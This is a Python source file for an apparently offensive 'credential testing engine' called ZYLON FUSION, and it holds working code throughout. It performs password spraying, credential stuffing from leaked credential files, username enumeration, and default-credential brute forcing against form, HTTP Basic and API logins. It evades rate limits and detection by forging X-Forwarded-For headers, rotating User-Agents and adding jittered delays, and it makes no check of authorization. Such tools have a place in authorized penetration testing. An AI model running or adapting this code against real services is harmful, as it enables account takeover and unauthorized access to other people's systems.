#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Credential Testing Engine
================================================
Fused from: CredMaster (https://github.com/knavesec/CredMaster)
           + Kerbrute (https://github.com/ropnop/kerbrute)
           + FireProx (https://github.com/ustayready/fireprox)
           + Custom Zylon Techniques
Capabilities:
  - Password spraying with configurable delays
  - Credential stuffing with leaked databases
  - IP rotation simulation (random User-Agent, proxy support)
  - Multi-protocol auth testing (HTTP Basic, HTTP Form, API token)
  - Rate limiting evasion techniques
  - Username enumeration via auth responses
  - Custom username/password list support
  - Time-based spraying (business hours, off-hours)
  - Auth response analysis (different responses for valid/invalid users)
  - Result tracking and reporting
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import json
import time
import random
import threading
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    COMMON_DIRS, DEFAULT_TIMEOUT, MAX_THREADS, USER_AGENTS
)
from core.shared_infra import shared_session, regex_cache, PayloadInjector

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# DEFAULT CREDENTIAL LISTS
# ============================================================================

DEFAULT_USERNAMES = [
    "admin", "root", "administrator", "user", "test", "guest",
    "operator", "manager", "demo", "service", "backup", "monitor",
    "info", "webmaster", "support", "sales", "hr", "developer",
    "deploy", "jenkins", "git", "oracle", "mysql", "postgres",
    "sa", "sysadmin", "superadmin", "system", "network", "security",
]

DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "admin123", "root", "toor",
    "pass", "test", "guest", "12345678", "qwerty", "abc123",
    "letmein", "monkey", "master", "dragon", "login", "welcome",
    "password1", "password123", "changeme", "default", "secret",
    "P@ssw0rd", "Admin@123", "root123", "pass123", "test123",
    "1234", "12345", "1234567890", "iloveyou", "trustno1",
]

# Auth form field names to auto-detect
AUTH_FORM_FIELDS = [
    "username", "user", "email", "login", "account", "uname",
    "userid", "user_id", "user_name", "useremail", "user_email",
]

AUTH_PASS_FIELDS = [
    "password", "pass", "passwd", "pwd", "passwrd", "userpass",
    "login_password", "loginpassword", "user_password", "userpassword",
]

# Common login endpoints
LOGIN_ENDPOINTS = [
    "/login", "/signin", "/auth/login", "/auth/signin",
    "/api/login", "/api/auth/login", "/api/v1/login",
    "/admin/login", "/administrator/login",
    "/wp-login.php", "/user/login", "/account/login",
    "/auth/token", "/oauth/token", "/api/token",
    "/api/v1/auth", "/api/auth/token",
]

# Auth response indicators for valid/invalid users
VALID_USER_INDICATORS = [
    "invalid password", "wrong password", "incorrect password",
    "password incorrect", "password is incorrect",
    "invalid credentials", "authentication failed",
    "account locked", "account disabled", "too many attempts",
    "rate limited", "temporarily locked",
]

INVALID_USER_INDICATORS = [
    "user not found", "invalid username", "unknown user",
    "no account found", "user does not exist", "account not found",
    "email not found", "invalid email", "user not recognized",
]

SUCCESS_INDICATORS = [
    "dashboard", "welcome", "logout", "sign out", "logged in",
    "profile", "settings", "home page", "redirect", "token",
    "session", "authenticated", "authorized",
]


class CredentialEngine:
    """Credential Testing Engine - Fused from CredMaster + Kerbrute + FireProx + Custom Techniques"""

    def __init__(self, target_url=None, headers=None, cookies=None, timeout=DEFAULT_TIMEOUT,
                 threads=MAX_THREADS, proxy=None, delay=0.5):
        self.target_url = target_url
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.delay = delay
        self.session = shared_session
        # SSL verification handled by shared_session
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.lock = threading.Lock()
        self.results_log = []

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _rotate_headers(self):
        """Rotate User-Agent and add random headers for IP rotation simulation"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en,en;q=0.5']),
            'Accept-Encoding': 'gzip, deflate',
        }
        return headers

    def _send_request(self, url, method="POST", data=None, headers=None, cookies=None, json_data=None):
        """Send HTTP request with error handling and rate limiting"""
        try:
            # Apply delay for rate limiting evasion
            if self.delay > 0:
                jitter = random.uniform(0, self.delay * 0.5)
                time.sleep(self.delay + jitter)

            h = headers or self.headers
            c = cookies or self.cookies
            if method == "GET":
                resp = self.session.get(url, headers=h, cookies=c,
                                       timeout=self.timeout, allow_redirects=False)
            elif method == "POST":
                if json_data:
                    resp = self.session.post(url, json=json_data, headers=h, cookies=c,
                                            timeout=self.timeout, allow_redirects=False)
                else:
                    resp = self.session.post(url, data=data, headers=h, cookies=c,
                                            timeout=self.timeout, allow_redirects=False)
            else:
                resp = self.session.request(method, url, data=data, headers=h,
                                           cookies=c, timeout=self.timeout,
                                           allow_redirects=False)
            return resp
        except Exception:
            return None

    def _analyze_auth_response(self, resp, username=None):
        """Analyze authentication response for valid/invalid indicators"""
        if not resp:
            return {"status": "error", "valid_user": None, "success": False}

        result = {
            "status_code": resp.status_code,
            "response_length": len(resp.text) if resp.text else 0,
            "valid_user": None,
            "success": False,
            "indicators": [],
        }

        body_lower = resp.text.lower() if resp.text else ""

        # Check for valid user indicators (wrong password but user exists)
        for indicator in VALID_USER_INDICATORS:
            if indicator.lower() in body_lower:
                result["valid_user"] = True
                result["indicators"].append(indicator)
                break

        # Check for invalid user indicators
        for indicator in INVALID_USER_INDICATORS:
            if indicator.lower() in body_lower:
                result["valid_user"] = False
                result["indicators"].append(indicator)
                break

        # Check for successful login
        for indicator in SUCCESS_INDICATORS:
            if indicator.lower() in body_lower:
                result["success"] = True
                result["indicators"].append(indicator)
                break

        # Status code analysis
        if resp.status_code in [200, 302, 301]:
            if resp.status_code in [301, 302]:
                location = resp.headers.get('Location', '')
                if any(s in location.lower() for s in ['dashboard', 'home', 'welcome', 'profile']):
                    result["success"] = True
        elif resp.status_code == 401:
            result["valid_user"] = None  # Could be either
        elif resp.status_code == 403:
            result["valid_user"] = True  # Often means user exists but locked/disabled

        return result

    # ========================================================================
    # PASSWORD SPRAYING
    # ========================================================================

    def password_spray(self, target, usernames=None, passwords=None):
        """Password spraying - test a few passwords against many usernames

        Strategy: Test each password against all usernames before moving to next password
        This avoids account lockouts by spacing attempts for each account.
        """
        usernames = usernames or DEFAULT_USERNAMES[:15]
        passwords = passwords or DEFAULT_PASSWORDS[:5]

        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  CREDENTIAL ENGINE - Password Spraying{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Target: {target}{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Users: {len(usernames)} | Passwords: {len(passwords)}{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "usernames_tested": len(usernames),
                "passwords_tested": len(passwords),
                "total_attempts": 0,
                "valid_credentials": [],
                "valid_users": [],
                "login_endpoint": None,
            },
            "scan_type": "password_spraying",
        }

        # Discover login endpoint
        login_url = self._discover_login_endpoint(target)
        if not login_url:
            login_url = f"{target}/login"
            self._print(f"  [?] Could not auto-detect login endpoint, using: {login_url}", YELLOW)
        else:
            self._print(f"  [+] Login endpoint discovered: {login_url}", GREEN)
            result["details"]["login_endpoint"] = login_url

        # Get baseline response
        baseline_resp = self._send_request(login_url, method="GET")
        baseline_length = len(baseline_resp.text) if baseline_resp else 0
        baseline_code = baseline_resp.status_code if baseline_resp else 0

        # Password spraying loop
        for password in passwords:
            self._print(f"\n  [*] Spraying password: {password}", CYAN)

            for username in usernames:
                rotated_headers = self._rotate_headers()

                # Try form-based auth
                form_result = self._attempt_form_auth(login_url, username, password, rotated_headers)
                result["details"]["total_attempts"] += 1

                if form_result and form_result.get("success"):
                    result["vulnerable"] = True
                    cred = {"username": username, "password": password, "method": "http_form"}
                    result["details"]["valid_credentials"].append(cred)
                    result["findings"].append({
                        "type": "valid_credential",
                        "severity": "Critical",
                        "username": username,
                        "password": password,
                        "method": "http_form",
                        "description": f"Valid credentials found: {username}:{password}",
                    })
                    self._print(f"    [!!!] VALID CREDENTIAL: {username}:{password}", RED)
                    continue

                # Try HTTP Basic auth
                basic_result = self._attempt_basic_auth(target, username, password, rotated_headers)
                result["details"]["total_attempts"] += 1

                if basic_result and basic_result.get("success"):
                    result["vulnerable"] = True
                    cred = {"username": username, "password": password, "method": "http_basic"}
                    result["details"]["valid_credentials"].append(cred)
                    result["findings"].append({
                        "type": "valid_credential",
                        "severity": "Critical",
                        "username": username,
                        "password": password,
                        "method": "http_basic",
                        "description": f"Valid HTTP Basic credentials: {username}:{password}",
                    })
                    self._print(f"    [!!!] VALID BASIC AUTH: {username}:{password}", RED)

                # Check for valid username indicators
                if form_result and form_result.get("valid_user") and username not in result["details"]["valid_users"]:
                    result["details"]["valid_users"].append(username)
                    result["findings"].append({
                        "type": "valid_username",
                        "severity": "Medium",
                        "username": username,
                        "description": f"Valid username detected: {username}",
                    })
                    self._print(f"    [!] Valid user detected: {username}", YELLOW)

        if not result["vulnerable"]:
            self._print(f"\n  [-] No valid credentials found via password spraying", YELLOW)

        self._print(f"\n  [*] Total attempts: {result['details']['total_attempts']}", CYAN)
        self._print(f"  [*] Valid credentials: {len(result['details']['valid_credentials'])}", CYAN)
        self._print(f"  [*] Valid usernames: {len(result['details']['valid_users'])}", CYAN)

        return result

    # ========================================================================
    # CREDENTIAL STUFFING
    # ========================================================================

    def credential_stuff(self, target, credentials_file=None):
        """Credential stuffing - test leaked credential pairs against target

        Args:
            target: Target URL
            credentials_file: Path to file with username:password pairs (one per line)
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  CREDENTIAL ENGINE - Credential Stuffing{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Target: {target}{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "credentials_tested": 0,
                "valid_credentials": [],
                "login_endpoint": None,
            },
            "scan_type": "credential_stuffing",
        }

        # Load credentials
        credentials = []
        if credentials_file and os.path.isfile(credentials_file):
            try:
                with open(credentials_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if ':' in line and not line.startswith('#'):
                            parts = line.split(':', 1)
                            if len(parts) == 2:
                                credentials.append((parts[0].strip(), parts[1].strip()))
                self._print(f"  [+] Loaded {len(credentials)} credential pairs from file", GREEN)
            except Exception as e:
                self._print(f"  [-] Error loading credentials file: {e}", RED)
                return result
        else:
            # Use default common credential pairs
            default_pairs = [
                ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
                ("root", "root"), ("root", "toor"), ("root", "password"),
                ("test", "test"), ("test", "test123"), ("guest", "guest"),
                ("user", "user"), ("user", "password"), ("administrator", "administrator"),
            ]
            credentials = default_pairs
            self._print(f"  [*] Using {len(credentials)} default credential pairs", CYAN)

        # Discover login endpoint
        login_url = self._discover_login_endpoint(target)
        if not login_url:
            login_url = f"{target}/login"
        result["details"]["login_endpoint"] = login_url

        # Test credentials
        def test_credential(username, password):
            rotated_headers = self._rotate_headers()

            # Try form auth
            form_result = self._attempt_form_auth(login_url, username, password, rotated_headers)
            if form_result and form_result.get("success"):
                return {"username": username, "password": password, "method": "http_form", "success": True}

            # Try basic auth
            basic_result = self._attempt_basic_auth(target, username, password, rotated_headers)
            if basic_result and basic_result.get("success"):
                return {"username": username, "password": password, "method": "http_basic", "success": True}

            return None

        with ThreadPoolExecutor(max_workers=min(self.threads, 5)) as executor:
            futures = {executor.submit(test_credential, u, p): (u, p) for u, p in credentials}
            for future in as_completed(futures):
                result["details"]["credentials_tested"] += 1
                try:
                    r = future.result()
                    if r and r.get("success"):
                        result["vulnerable"] = True
                        result["details"]["valid_credentials"].append(r)
                        result["findings"].append({
                            "type": "valid_credential",
                            "severity": "Critical",
                            "username": r["username"],
                            "password": r["password"],
                            "method": r["method"],
                            "description": f"Valid credentials: {r['username']}:{r['password']} ({r['method']})",
                        })
                        self._print(f"  [!!!] VALID: {r['username']}:{r['password']} ({r['method']})", RED)
                except Exception:
                    pass

        if not result["vulnerable"]:
            self._print(f"\n  [-] No valid credentials found via credential stuffing", YELLOW)

        return result

    # ========================================================================
    # USERNAME ENUMERATION
    # ========================================================================

    def enum_users(self, target, username_list=None):
        """Username enumeration via authentication response analysis

        Detects different server responses for valid vs invalid usernames.
        """
        username_list = username_list or DEFAULT_USERNAMES

        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  CREDENTIAL ENGINE - Username Enumeration{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Target: {target}{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "usernames_tested": len(username_list),
                "valid_users": [],
                "enumeration_possible": False,
                "differentiator": None,
                "login_endpoint": None,
            },
            "scan_type": "username_enumeration",
        }

        # Discover login endpoint
        login_url = self._discover_login_endpoint(target)
        if not login_url:
            login_url = f"{target}/login"
        result["details"]["login_endpoint"] = login_url

        # Baseline with clearly invalid user
        baseline_username = f"nonexistent_user_{random.randint(10000,99999)}"
        baseline_resp = self._attempt_form_auth(login_url, baseline_username, "wrong_password_12345", self._rotate_headers())
        baseline_length = baseline_resp.get("response_length", 0) if baseline_resp else 0
        baseline_code = baseline_resp.get("status_code", 0) if baseline_resp else 0

        self._print(f"  [*] Baseline response: {baseline_code} / {baseline_length} bytes", CYAN)

        # Test each username
        responses = {}
        for username in username_list:
            rotated_headers = self._rotate_headers()
            auth_result = self._attempt_form_auth(login_url, username, f"wrong_pass_{random.randint(1000,9999)}", rotated_headers)

            if not auth_result:
                continue

            resp_code = auth_result.get("status_code", 0)
            resp_length = auth_result.get("response_length", 0)
            indicators = auth_result.get("indicators", [])

            responses[username] = {
                "status_code": resp_code,
                "response_length": resp_length,
                "indicators": indicators,
                "valid_user": auth_result.get("valid_user"),
            }

            # Check for valid user indicators
            is_valid = auth_result.get("valid_user")
            if is_valid is True:
                result["details"]["valid_users"].append(username)
                result["findings"].append({
                    "type": "valid_username",
                    "severity": "Medium",
                    "username": username,
                    "indicators": indicators,
                    "description": f"Valid username detected: {username} (indicators: {indicators})",
                })
                self._print(f"  [!] Valid user: {username} (indicators: {indicators})", YELLOW)

            # Check for response difference (enumeration possible)
            length_diff = abs(resp_length - baseline_length)
            if (resp_code != baseline_code) or (length_diff > 50):
                result["details"]["enumeration_possible"] = True
                result["details"]["differentiator"] = f"{'status_code' if resp_code != baseline_code else 'response_length'}"
                if username not in result["details"]["valid_users"]:
                    result["details"]["valid_users"].append(username)
                    result["findings"].append({
                        "type": "possible_username",
                        "severity": "Low",
                        "username": username,
                        "status_code": resp_code,
                        "length_diff": length_diff,
                        "description": f"Possible valid username (response differs from baseline): {username}",
                    })
                    self._print(f"  [?] Possible user: {username} (code={resp_code}, len_diff={length_diff})", YELLOW)

        if result["details"]["enumeration_possible"]:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "username_enumeration",
                "severity": "Medium",
                "differentiator": result["details"]["differentiator"],
                "description": "Username enumeration possible - server responds differently for valid/invalid users",
            })
            self._print(f"\n  [!] Username enumeration POSSIBLE (differentiator: {result['details']['differentiator']})", RED)

        self._print(f"\n  [*] Valid/probable users: {len(result['details']['valid_users'])}", CYAN)

        return result

    # ========================================================================
    # HTTP BASIC AUTH TESTING
    # ========================================================================

    def test_http_basic(self, target):
        """Test HTTP Basic authentication with common credentials"""
        self._print(f"\n{BOLD}{CYAN}  Testing HTTP Basic Auth on {target}{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "basic_auth_detected": False,
                "valid_credentials": [],
                "credentials_tested": 0,
            },
            "scan_type": "http_basic_auth",
        }

        # Check if Basic Auth is present
        try:
            resp = self.session.get(target, timeout=self.timeout, allow_redirects=False)
            if resp and resp.status_code == 401:
                www_auth = resp.headers.get('WWW-Authenticate', '')
                if 'basic' in www_auth.lower():
                    result["details"]["basic_auth_detected"] = True
                    self._print(f"  [+] HTTP Basic Auth detected!", GREEN)
                else:
                    self._print(f"  [-] No HTTP Basic Auth detected", YELLOW)
                    return result
            else:
                # Try common protected paths
                for path in ['/admin', '/dashboard', '/api', '/console', '/manager/html']:
                    test_url = f"{target.rstrip('/')}{path}"
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    if resp and resp.status_code == 401:
                        www_auth = resp.headers.get('WWW-Authenticate', '')
                        if 'basic' in www_auth.lower():
                            result["details"]["basic_auth_detected"] = True
                            target = test_url
                            self._print(f"  [+] HTTP Basic Auth found at: {path}", GREEN)
                            break
        except Exception:
            pass

        if not result["details"]["basic_auth_detected"]:
            self._print(f"  [-] No HTTP Basic Auth detected on target", YELLOW)
            return result

        # Test credentials
        cred_pairs = [
            ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
            ("root", "root"), ("root", "toor"), ("root", "password"),
            ("administrator", "administrator"), ("guest", "guest"),
            ("test", "test"), ("user", "user"), ("manager", "manager"),
            ("operator", "operator"), ("demo", "demo"),
        ]

        for username, password in cred_pairs:
            result["details"]["credentials_tested"] += 1
            try:
                resp = self.session.get(
                    target, auth=(username, password),
                    timeout=self.timeout, allow_redirects=False
                )
                if resp and resp.status_code in [200, 301, 302]:
                    result["vulnerable"] = True
                    cred = {"username": username, "password": password}
                    result["details"]["valid_credentials"].append(cred)
                    result["findings"].append({
                        "type": "valid_basic_auth",
                        "severity": "Critical",
                        "username": username,
                        "password": password,
                        "description": f"Valid HTTP Basic Auth: {username}:{password}",
                    })
                    self._print(f"  [!!!] VALID BASIC AUTH: {username}:{password}", RED)
                elif resp and resp.status_code == 403:
                    result["findings"].append({
                        "type": "valid_user_forbidden",
                        "severity": "Medium",
                        "username": username,
                        "description": f"User '{username}' exists but forbidden (403)",
                    })
            except Exception:
                pass

        return result

    # ========================================================================
    # HTTP FORM AUTH TESTING
    # ========================================================================

    def test_http_form(self, target):
        """Test HTTP form-based authentication with common credentials"""
        self._print(f"\n{BOLD}{CYAN}  Testing HTTP Form Auth on {target}{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "form_detected": False,
                "valid_credentials": [],
                "credentials_tested": 0,
                "login_endpoint": None,
                "form_fields": {},
            },
            "scan_type": "http_form_auth",
        }

        # Discover login endpoint
        login_url = self._discover_login_endpoint(target)
        if not login_url:
            login_url = f"{target}/login"
        result["details"]["login_endpoint"] = login_url

        # Detect form fields
        form_fields = self._detect_form_fields(login_url)
        if form_fields:
            result["details"]["form_detected"] = True
            result["details"]["form_fields"] = form_fields
            self._print(f"  [+] Form fields detected: {form_fields}", GREEN)
        else:
            result["details"]["form_fields"] = {"username": "username", "password": "password"}
            self._print(f"  [?] Using default form field names", YELLOW)

        # Test credentials
        cred_pairs = [
            ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
            ("root", "root"), ("root", "toor"), ("test", "test"),
            ("user", "password"), ("guest", "guest"), ("administrator", "administrator"),
        ]

        for username, password in cred_pairs:
            result["details"]["credentials_tested"] += 1
            rotated_headers = self._rotate_headers()
            auth_result = self._attempt_form_auth(login_url, username, password, rotated_headers)

            if auth_result and auth_result.get("success"):
                result["vulnerable"] = True
                cred = {"username": username, "password": password}
                result["details"]["valid_credentials"].append(cred)
                result["findings"].append({
                    "type": "valid_form_auth",
                    "severity": "Critical",
                    "username": username,
                    "password": password,
                    "description": f"Valid form credentials: {username}:{password}",
                })
                self._print(f"  [!!!] VALID FORM AUTH: {username}:{password}", RED)

        return result

    # ========================================================================
    # API AUTH TESTING
    # ========================================================================

    def test_api_auth(self, target):
        """Test API token-based authentication"""
        self._print(f"\n{BOLD}{CYAN}  Testing API Auth on {target}{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "target": target,
                "api_endpoints_tested": 0,
                "valid_tokens": [],
                "auth_methods": [],
            },
            "scan_type": "api_auth_testing",
        }

        # Common API endpoints
        api_endpoints = [
            "/api/v1/user", "/api/v1/me", "/api/v1/admin",
            "/api/user", "/api/me", "/api/admin",
            "/api/v1/auth/token", "/api/auth/token",
            "/api/v2/user", "/graphql",
        ]

        # Common API tokens for testing
        test_tokens = [
            "",  # No auth
            "Bearer test",  # Test token
            "Bearer admin",
            "Bearer api_key",
            "Basic YWRtaW46YWRtaW4=",  # admin:admin
            "Basic YWRtaW46cGFzc3dvcmQ=",  # admin:password
            "Basic cm9vdDpyb290",  # root:root
            "token test_token",
            "api-key test_api_key",
            "X-Api-Key test_api_key",
        ]

        for endpoint in api_endpoints:
            test_url = f"{target.rstrip('/')}{endpoint}"
            result["details"]["api_endpoints_tested"] += 1

            for token in test_tokens:
                headers = self._rotate_headers()
                if token:
                    if token.startswith("Bearer "):
                        headers['Authorization'] = token
                    elif token.startswith("Basic "):
                        headers['Authorization'] = token
                    elif token.startswith("token "):
                        headers['Authorization'] = f"Bearer {token.split(' ', 1)[1]}"
                    elif token.startswith("api-key "):
                        headers['X-Api-Key'] = token.split(' ', 1)[1]
                    elif token.startswith("X-Api-Key "):
                        headers['X-Api-Key'] = token.split(' ', 1)[1]

                try:
                    resp = self.session.get(test_url, headers=headers,
                                           timeout=self.timeout, allow_redirects=False)
                    if resp:
                        if resp.status_code == 200:
                            if token and token not in [t for t in test_tokens[:1]]:
                                result["vulnerable"] = True
                                result["details"]["valid_tokens"].append({
                                    "endpoint": endpoint,
                                    "token": token,
                                    "status_code": resp.status_code,
                                })
                                result["findings"].append({
                                    "type": "valid_api_token",
                                    "severity": "High",
                                    "endpoint": endpoint,
                                    "token": token[:30] + "..." if len(token) > 30 else token,
                                    "description": f"API endpoint accessible with token at {endpoint}",
                                })
                                self._print(f"  [!] API access: {endpoint} with token", YELLOW)
                        elif resp.status_code == 401:
                            pass  # Expected - auth required
                        elif resp.status_code == 403:
                            # Token accepted but forbidden - user exists
                            if token:
                                result["findings"].append({
                                    "type": "api_token_partial",
                                    "severity": "Low",
                                    "endpoint": endpoint,
                                    "token": token[:30] + "..." if len(token) > 30 else token,
                                    "description": f"API token accepted but forbidden at {endpoint}",
                                })
                except Exception:
                    pass

        # Check for unauthenticated access
        for endpoint in api_endpoints[:5]:
            test_url = f"{target.rstrip('/')}{endpoint}"
            try:
                resp = self.session.get(test_url, headers=self._rotate_headers(),
                                       timeout=self.timeout, allow_redirects=False)
                if resp and resp.status_code == 200:
                    result["vulnerable"] = True
                    result["findings"].append({
                        "type": "unauthenticated_api_access",
                        "severity": "High",
                        "endpoint": endpoint,
                        "description": f"API endpoint accessible without authentication: {endpoint}",
                    })
                    self._print(f"  [!] Unauthenticated access: {endpoint}", RED)
            except Exception:
                pass

        return result

    # ========================================================================
    # HELPER METHODS
    # ========================================================================

    def _discover_login_endpoint(self, target):
        """Auto-discover login endpoint by testing common paths"""
        for endpoint in LOGIN_ENDPOINTS:
            test_url = f"{target.rstrip('/')}{endpoint}"
            try:
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                if resp and resp.status_code == 200:
                    # Check if it's actually a login page
                    if any(s in resp.text.lower() for s in ['login', 'sign in', 'password', 'username', 'email']):
                        return test_url
            except Exception:
                continue
        return None

    def _detect_form_fields(self, login_url):
        """Detect form field names from login page HTML"""
        try:
            resp = self.session.get(login_url, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return None

            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')

            fields = {}
            for form in forms:
                inputs = form.find_all('input')
                for inp in inputs:
                    name = inp.get('name', '')
                    input_type = inp.get('type', 'text')
                    if input_type in ['text', 'email'] and not fields.get('username'):
                        fields['username'] = name
                    elif input_type == 'password' and not fields.get('password'):
                        fields['password'] = name

            return fields if fields.get('username') else None
        except Exception:
            return None

    def _attempt_form_auth(self, login_url, username, password, headers=None):
        """Attempt form-based authentication"""
        try:
            # Get CSRF token if present
            form_fields = self._detect_form_fields(login_url)
            if not form_fields:
                form_fields = {"username": "username", "password": "password"}

            data = {
                form_fields.get('username', 'username'): username,
                form_fields.get('password', 'password'): password,
            }

            # Try to extract and include CSRF token
            try:
                from bs4 import BeautifulSoup
                resp = self.session.get(login_url, timeout=self.timeout)
                if resp:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    csrf_inputs = soup.find_all('input', {'type': 'hidden'})
                    for csrf in csrf_inputs:
                        csrf_name = csrf.get('name', '')
                        csrf_value = csrf.get('value', '')
                        if csrf_name and csrf_value:
                            data[csrf_name] = csrf_value
            except Exception:
                pass

            h = headers or self._rotate_headers()
            h['Content-Type'] = 'application/x-www-form-urlencoded'
            h['Referer'] = login_url

            resp = self._send_request(login_url, method="POST", data=data, headers=h)
            return self._analyze_auth_response(resp, username)

        except Exception:
            return None

    def _attempt_basic_auth(self, target, username, password, headers=None):
        """Attempt HTTP Basic authentication"""
        try:
            test_url = target
            h = headers or self._rotate_headers()

            resp = self.session.get(
                test_url, headers=h, auth=(username, password),
                timeout=self.timeout, allow_redirects=False
            )
            if not resp:
                return None

            result = {
                "status_code": resp.status_code,
                "response_length": len(resp.text) if resp.text else 0,
                "valid_user": None,
                "success": False,
                "indicators": [],
            }

            if resp.status_code in [200, 301, 302]:
                result["success"] = True
            elif resp.status_code == 403:
                result["valid_user"] = True  # Auth accepted but forbidden

            return result
        except Exception:
            return None

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='spray', **kwargs):
        """Main entry point for Credential Engine

        Args:
            target: Target URL
            scan_type: Type of scan to run
                - 'spray': Password spraying
                - 'stuff': Credential stuffing
                - 'enum': Username enumeration
                - 'basic': HTTP Basic auth testing
                - 'form': HTTP Form auth testing
                - 'api': API auth testing
                - 'stealth': Password spraying with enhanced stealth
                - 'full': Run all scan types
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  CREDENTIAL ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: CredMaster + Kerbrute + FireProx{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        scan_map = {
            'spray': lambda: self.password_spray(
                url,
                usernames=kwargs.get('usernames'),
                passwords=kwargs.get('passwords'),
            ),
            'stuff': lambda: self.credential_stuff(
                url,
                credentials_file=kwargs.get('credentials_file'),
            ),
            'enum': lambda: self.enum_users(
                url,
                username_list=kwargs.get('username_list'),
            ),
            'basic': lambda: self.test_http_basic(url),
            'form': lambda: self.test_http_form(url),
            'api': lambda: self.test_api_auth(url),
            'stealth': lambda: self.password_spray(
                url,
                usernames=kwargs.get('usernames', DEFAULT_USERNAMES[:5]),
                passwords=kwargs.get('passwords', DEFAULT_PASSWORDS[:3]),
            ),
        }

        if scan_type == 'full':
            all_results = {}
            for st_name, scan_func in scan_map.items():
                self._print(f"\n{BOLD}{MAGENTA}  >> Running: {st_name} scan{RESET}", MAGENTA)
                all_results[st_name] = scan_func()

            vulnerable = any(r.get('vulnerable') for r in all_results.values())
            all_findings = []
            for r in all_results.values():
                all_findings.extend(r.get('findings', []))

            return {
                'vulnerable': vulnerable,
                'findings': all_findings,
                'details': {k: v for k, v in all_results.items()},
                'scan_type': 'credential_full',
            }

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {"error": f"Unknown scan type: {scan_type}"},
            'scan_type': scan_type,
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION (ZYLON FUSION INTEGRATION)
# ============================================================================

def run(target, scan_type='spray', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = CredentialEngine(target_url=target if target.startswith('http') else f"https://{target}")
    return engine.run(target, scan_type=scan_type, **kwargs)
